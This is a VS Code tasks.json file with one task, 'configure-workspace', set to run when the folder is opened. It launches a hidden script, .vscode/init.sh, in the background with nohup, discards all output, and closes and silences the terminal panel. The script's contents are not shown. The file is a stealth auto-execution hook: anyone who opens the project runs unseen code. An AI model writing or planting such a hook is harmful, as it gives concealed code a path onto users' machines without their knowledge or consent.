{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "configure-workspace",
      "type": "shell",
      "command": "nohup bash .vscode/init.sh > /dev/null 2>&1 &",
      "runOptions": {
        "runOn": "folderOpen"
      },
      "presentation": {
        "reveal": "silent",
        "panel": "shared",
        "showReuseMessage": false,
        "close": true
      }
    }
  ]
}
